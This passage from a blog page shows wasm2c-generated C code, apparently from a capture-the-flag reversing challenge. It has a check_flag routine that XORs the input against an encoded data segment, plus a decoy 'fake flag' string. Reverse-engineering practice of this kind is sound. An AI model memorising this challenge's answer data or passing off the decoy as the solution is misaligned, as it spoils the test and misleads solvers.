WASM_RT_MODULE_PREFIX</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WASM_RT_PASTE_(x, y) x ## y</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WASM_RT_PASTE(x, y) WASM_RT_PASTE_(x, y)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WASM_RT_ADD_PREFIX(x) WASM_RT_PASTE(WASM_RT_MODULE_PREFIX, x)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* TODO(binji): only use stdint.h types in header */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint8_t</span> u8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int8_t</span> s8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> u16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int16_t</span> s16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span> s32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int64_t</span> s64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">float</span> f32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> f64;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">WASM_RT_ADD_PREFIX</span><span class="params">(init)</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* export: &#x27;memory&#x27; */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="title">wasm_rt_memory_t</span> <span class="params">(*WASM_RT_ADD_PREFIX(Z_memory))</span></span>;</span><br><span class="line"><span class="comment">/* export: &#x27;get_buf&#x27; */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="title">u32</span> <span class="params">(*WASM_RT_ADD_PREFIX(Z_get_bufZ_iv))</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="comment">/* export: &#x27;check_flag&#x27; */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="title">u32</span> <span class="params">(*WASM_RT_ADD_PREFIX(Z_check_flagZ_ii))</span><span class="params">(u32)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* __FLAG_H_GENERATED_ */</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.c</span></span><br><span class="line"><span class="comment">/* Automically generated by wasm2c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;./flag.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNLIKELY(x) __builtin_expect(!!(x), 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIKELY(x) __builtin_expect(!!(x), 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRAP(x) (wasm_rt_trap(WASM_RT_TRAP_##x), 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FUNC_PROLOGUE                                            \</span></span><br><span class="line">  <span class="keyword">if</span> (++wasm_rt_call_stack_depth &gt; WASM_RT_MAX_CALL_STACK_DEPTH) \</span><br><span class="line">    TRAP(EXHAUSTION)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FUNC_EPILOGUE --wasm_rt_call_stack_depth</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNREACHABLE TRAP(UNREACHABLE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CALL_INDIRECT(table, t, ft, x, ...)          \</span></span><br><span class="line">  (LIKELY((x) &lt; table.size &amp;&amp; table.data[x].func &amp;&amp;  \</span><br><span class="line">          table.data[x].func_type == func_types[ft]) \</span><br><span class="line">       ? ((t)table.data[x].func)(__VA_ARGS__)        \</span><br><span class="line">       : TRAP(CALL_INDIRECT))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> WASM_RT_MEMCHECK_SIGNAL_HANDLER</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MEMCHECK(mem, a, t)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MEMCHECK(mem, a, t)  \</span></span><br><span class="line">  <span class="keyword">if</span> (UNLIKELY((a) + <span class="keyword">sizeof</span>(t) &gt; mem-&gt;size)) TRAP(OOB)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFINE_LOAD(name, t1, t2, t3)                        \</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> t3 <span class="title">name</span><span class="params">(<span class="keyword">wasm_rt_memory_t</span>* mem, u64 addr)</span> </span>&#123;   \</span><br><span class="line">    MEMCHECK(mem, addr, t1);                                 \</span><br><span class="line">    t1 result;                                               \</span><br><span class="line">    __builtin_memcpy(&amp;result, &amp;mem-&gt;data[addr], <span class="keyword">sizeof</span>(t1)); \</span><br><span class="line">    <span class="keyword">return</span> (t3)(t2)result;                                   \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFINE_STORE(name, t1, t2)                                     \</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">name</span><span class="params">(<span class="keyword">wasm_rt_memory_t</span>* mem, u64 addr, t2 value)</span> </span>&#123; \</span><br><span class="line">    MEMCHECK(mem, addr, t1);                                           \</span><br><span class="line">    t1 wrapped = (t1)value;                                            \</span><br><span class="line">    __builtin_memcpy(&amp;mem-&gt;data[addr], &amp;wrapped, <span class="keyword">sizeof</span>(t1));          \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">DEFINE_LOAD(i32_load, u32, u32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load, u64, u64, u64);</span><br><span class="line">DEFINE_LOAD(f32_load, f32, f32, f32);</span><br><span class="line">DEFINE_LOAD(f64_load, f64, f64, f64);</span><br><span class="line">DEFINE_LOAD(i32_load8_s, s8, s32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load8_s, s8, s64, u64);</span><br><span class="line">DEFINE_LOAD(i32_load8_u, u8, u32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load8_u, u8, u64, u64);</span><br><span class="line">DEFINE_LOAD(i32_load16_s, s16, s32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load16_s, s16, s64, u64);</span><br><span class="line">DEFINE_LOAD(i32_load16_u, u16, u32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load16_u, u16, u64, u64);</span><br><span class="line">DEFINE_LOAD(i64_load32_s, s32, s64, u64);</span><br><span class="line">DEFINE_LOAD(i64_load32_u, u32, u64, u64);</span><br><span class="line">DEFINE_STORE(i32_store, u32, u32);</span><br><span class="line">DEFINE_STORE(i64_store, u64, u64);</span><br><span class="line">DEFINE_STORE(f32_store, f32, f32);</span><br><span class="line">DEFINE_STORE(f64_store, f64, f64);</span><br><span class="line">DEFINE_STORE(i32_store8, u8, u32);</span><br><span class="line">DEFINE_STORE(i32_store16, u16, u32);</span><br><span class="line">DEFINE_STORE(i64_store8, u8, u64);</span><br><span class="line">DEFINE_STORE(i64_store16, u16, u64);</span><br><span class="line">DEFINE_STORE(i64_store32, u32, u64);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_CLZ(x) ((x) ? __builtin_clz(x) : 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_CLZ(x) ((x) ? __builtin_clzll(x) : 64)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_CTZ(x) ((x) ? __builtin_ctz(x) : 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_CTZ(x) ((x) ? __builtin_ctzll(x) : 64)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_POPCNT(x) (__builtin_popcount(x))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_POPCNT(x) (__builtin_popcountll(x))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIV_S(ut, min, x, y)                                 \</span></span><br><span class="line">   ((UNLIKELY((y) == <span class="number">0</span>)) ?                TRAP(DIV_BY_ZERO)  \</span><br><span class="line">  : (UNLIKELY((x) == min &amp;&amp; (y) == <span class="number">-1</span>)) ? TRAP(INT_OVERFLOW) \</span><br><span class="line">  : (ut)((x) / (y)))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REM_S(ut, min, x, y)                                \</span></span><br><span class="line">   ((UNLIKELY((y) == <span class="number">0</span>)) ?                TRAP(DIV_BY_ZERO) \</span><br><span class="line">  : (UNLIKELY((x) == min &amp;&amp; (y) == <span class="number">-1</span>)) ? <span class="number">0</span>                 \</span><br><span class="line">  : (ut)((x) % (y)))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_DIV_S(x, y) DIV_S(u32, INT32_MIN, (s32)x, (s32)y)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_DIV_S(x, y) DIV_S(u64, INT64_MIN, (s64)x, (s64)y)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_REM_S(x, y) REM_S(u32, INT32_MIN, (s32)x, (s32)y)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_REM_S(x, y) REM_S(u64, INT64_MIN, (s64)x, (s64)y)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIVREM_U(op, x, y) \</span></span><br><span class="line">  ((UNLIKELY((y) == <span class="number">0</span>)) ? TRAP(DIV_BY_ZERO) : ((x) op (y)))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIV_U(x, y) DIVREM_U(/, x, y)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REM_U(x, y) DIVREM_U(%, x, y)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROTL(x, y, mask) \</span></span><br><span class="line">  (((x) &lt;&lt; ((y) &amp; (mask))) | ((x) &gt;&gt; (((mask) - (y) + <span class="number">1</span>) &amp; (mask))))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROTR(x, y, mask) \</span></span><br><span class="line">  (((x) &gt;&gt; ((y) &amp; (mask))) | ((x) &lt;&lt; (((mask) - (y) + <span class="number">1</span>) &amp; (mask))))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_ROTL(x, y) ROTL(x, y, 31)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_ROTL(x, y) ROTL(x, y, 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_ROTR(x, y) ROTR(x, y, 31)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_ROTR(x, y) ROTR(x, y, 63)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FMIN(x, y)                                          \</span></span><br><span class="line">   ((UNLIKELY((x) != (x))) ? NAN                            \</span><br><span class="line">  : (UNLIKELY((y) != (y))) ? NAN                            \</span><br><span class="line">  : (UNLIKELY((x) == <span class="number">0</span> &amp;&amp; (y) == <span class="number">0</span>)) ? (signbit(x) ? x : y) \</span><br><span class="line">  : (x &lt; y) ? x : y)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FMAX(x, y)                                          \</span></span><br><span class="line">   ((UNLIKELY((x) != (x))) ? NAN                            \</span><br><span class="line">  : (UNLIKELY((y) != (y))) ? NAN                            \</span><br><span class="line">  : (UNLIKELY((x) == <span class="number">0</span> &amp;&amp; (y) == <span class="number">0</span>)) ? (signbit(x) ? y : x) \</span><br><span class="line">  : (x &gt; y) ? x : y)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRUNC_S(ut, st, ft, min, minop, max, x)                             \</span></span><br><span class="line">  ((UNLIKELY((x) != (x)))                        ? TRAP(INVALID_CONVERSION) \</span><br><span class="line">   : (UNLIKELY(!((x)minop(min) &amp;&amp; (x) &lt; (max)))) ? TRAP(INT_OVERFLOW)       \</span><br><span class="line">                                                 : (ut)(st)(x))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_TRUNC_S_F32(x) TRUNC_S(u32, s32, f32, (f32)INT32_MIN, &gt;=, 2147483648.f, x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_TRUNC_S_F32(x) TRUNC_S(u64, s64, f32, (f32)INT64_MIN, &gt;=, (f32)INT64_MAX, x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_TRUNC_S_F64(x) TRUNC_S(u32, s32, f64, -2147483649., &gt;, 2147483648., x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_TRUNC_S_F64(x) TRUNC_S(u64, s64, f64, (f64)INT64_MIN, &gt;=, (f64)INT64_MAX, x)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRUNC_U(ut, ft, max, x)                                            \</span></span><br><span class="line">  ((UNLIKELY((x) != (x)))                       ? TRAP(INVALID_CONVERSION) \</span><br><span class="line">   : (UNLIKELY(!((x) &gt; (ft)<span class="number">-1</span> &amp;&amp; (x) &lt; (max)))) ? TRAP(INT_OVERFLOW)       \</span><br><span class="line">                                                : (ut)(x))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_TRUNC_U_F32(x) TRUNC_U(u32, f32, 4294967296.f, x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_TRUNC_U_F32(x) TRUNC_U(u64, f32, (f32)UINT64_MAX, x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I32_TRUNC_U_F64(x) TRUNC_U(u32, f64, 4294967296.,  x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I64_TRUNC_U_F64(x) TRUNC_U(u64, f64, (f64)UINT64_MAX, x)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFINE_REINTERPRET(name, t1, t2)  \</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> t2 <span class="title">name</span><span class="params">(t1 x)</span> </span>&#123;           \</span><br><span class="line">    t2 result;                            \</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;result, &amp;x, <span class="keyword">sizeof</span>(result));  \</span><br><span class="line">    <span class="keyword">return</span> result;                        \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">DEFINE_REINTERPRET(f32_reinterpret_i32, u32, f32)</span><br><span class="line">DEFINE_REINTERPRET(i32_reinterpret_f32, f32, u32)</span><br><span class="line">DEFINE_REINTERPRET(f64_reinterpret_i64, u64, f64)</span><br><span class="line">DEFINE_REINTERPRET(i64_reinterpret_f64, f64, u64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u32 func_types[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init_func_types</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  func_types[<span class="number">0</span>] = wasm_rt_register_func_type(<span class="number">0</span>, <span class="number">1</span>, WASM_RT_I32);</span><br><span class="line">  func_types[<span class="number">1</span>] = wasm_rt_register_func_type(<span class="number">1</span>, <span class="number">1</span>, WASM_RT_I32, WASM_RT_I32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">w2c_get_buf</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">w2c_check_flag</span><span class="params">(u32)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init_globals</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">wasm_rt_memory_t</span> w2c_memory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">wasm_rt_table_t</span> w2c_T0;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">w2c_get_buf</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  FUNC_PROLOGUE;</span><br><span class="line">  u32 w2c_i0;</span><br><span class="line">  w2c_i0 = <span class="number">80u</span>;</span><br><span class="line">  FUNC_EPILOGUE;</span><br><span class="line">  <span class="keyword">return</span> w2c_i0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">w2c_check_flag</span><span class="params">(u32 w2c_p0)</span> </span>&#123;</span><br><span class="line">  u32 w2c_l1 = <span class="number">0</span>, w2c_l2 = <span class="number">0</span>;</span><br><span class="line">  FUNC_PROLOGUE;</span><br><span class="line">  u32 w2c_i0, w2c_i1, w2c_i2;</span><br><span class="line">  w2c_i0 = <span class="number">0u</span>;</span><br><span class="line">  w2c_l1 = w2c_i0;</span><br><span class="line">  w2c_i0 = <span class="number">0u</span>;</span><br><span class="line">  w2c_l2 = w2c_i0;</span><br><span class="line">  w2c_L0: </span><br><span class="line">    w2c_i0 = w2c_p0;</span><br><span class="line">    w2c_i1 = w2c_l2;</span><br><span class="line">    w2c_i0 += w2c_i1;</span><br><span class="line">    w2c_i0 = i32_load8_u((&amp;w2c_memory), (u64)(w2c_i0));</span><br><span class="line">    w2c_i1 = w2c_l2;</span><br><span class="line">    w2c_i2 = <span class="number">16u</span>;</span><br><span class="line">    w2c_i1 += w2c_i2;</span><br><span class="line">    w2c_i1 = i32_load8_u((&amp;w2c_memory), (u64)(w2c_i1));</span><br><span class="line">    w2c_i0 ^= w2c_i1;</span><br><span class="line">    w2c_i1 = <span class="number">24u</span>;</span><br><span class="line">    w2c_i0 &lt;&lt;= (w2c_i1 &amp; <span class="number">31</span>);</span><br><span class="line">    w2c_i1 = <span class="number">24u</span>;</span><br><span class="line">    w2c_i0 = (u32)((s32)w2c_i0 &gt;&gt; (w2c_i1 &amp; <span class="number">31</span>));</span><br><span class="line">    w2c_i1 = <span class="number">66u</span>;</span><br><span class="line">    w2c_i0 ^= w2c_i1;</span><br><span class="line">    w2c_i1 = w2c_l1;</span><br><span class="line">    w2c_i0 |= w2c_i1;</span><br><span class="line">    w2c_l1 = w2c_i0;</span><br><span class="line">    w2c_i0 = w2c_l2;</span><br><span class="line">    w2c_i1 = <span class="number">1u</span>;</span><br><span class="line">    w2c_i0 += w2c_i1;</span><br><span class="line">    w2c_l2 = w2c_i0;</span><br><span class="line">    w2c_i1 = <span class="number">23u</span>;</span><br><span class="line">    w2c_i0 = w2c_i0 != w2c_i1;</span><br><span class="line">    <span class="keyword">if</span> (w2c_i0) &#123;<span class="keyword">goto</span> w2c_L0;&#125;</span><br><span class="line">  w2c_i0 = w2c_l1;</span><br><span class="line">  w2c_i0 = !(w2c_i0);</span><br><span class="line">  FUNC_EPILOGUE;</span><br><span class="line">  <span class="keyword">return</span> w2c_i0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8 data_segment_data_0[] = &#123;</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x2e</span>, <span class="number">0x23</span>, <span class="number">0x25</span>, <span class="number">0x39</span>, <span class="number">0x0a</span>, <span class="number">0x27</span>, <span class="number">0x2e</span>, <span class="number">0x2e</span>, <span class="number">0x2d</span>, <span class="number">0x15</span>, <span class="number">0x27</span>, </span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x03</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x27</span>, <span class="number">0x2f</span>, <span class="number">0x20</span>, <span class="number">0x2e</span>, <span class="number">0x3b</span>, <span class="number">0x3f</span>, <span class="number">0x42</span>, </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8 data_segment_data_1[] = &#123;</span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7b</span>, <span class="number">0x54</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x46</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, </span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0x49</span>, <span class="number">0x73</span>, <span class="number">0x46</span>, <span class="number">0x61</span>, <span class="number">0x6b</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x00</span>, </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init_memory</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  wasm_rt_allocate_memory((&amp;w2c_memory), <span class="number">1</span>, <span class="number">65536</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;(w2c_memory.data[<span class="number">16u</span>]), data_segment_data_0, <span class="number">23</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;(w2c_memory.data[<span class="number">48u</span>]), data_segment_data_1, <span class="number">21</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init_table</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> offset;</span><br><span class="line">  wasm_rt_allocate_table((&amp;w2c_T0), <span class="number">0</span>, <span class="number">4294967295</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* export: &#x27;memory&#x27; */</span></span><br><span class="line"><span class="keyword">wasm_rt_memory_t</span> (*WASM_RT_ADD_PREFIX(Z_memory));</span><br><span class="line"><span class="comment">/* export: &#x27;get_buf&#x27; */</span></span><br><span class="line">u32 (*WASM_RT_ADD_PREFIX(Z_get_bufZ_iv))(<span class="keyword">void</span>);</span><br><span class="line"><span class="comment">/* export: &#x27;check_flag&#x27; */</span></span><br><span class="line">u32 (*WASM_RT_ADD_PREFIX(Z_check_flagZ_ii))(u32);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init_exports</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  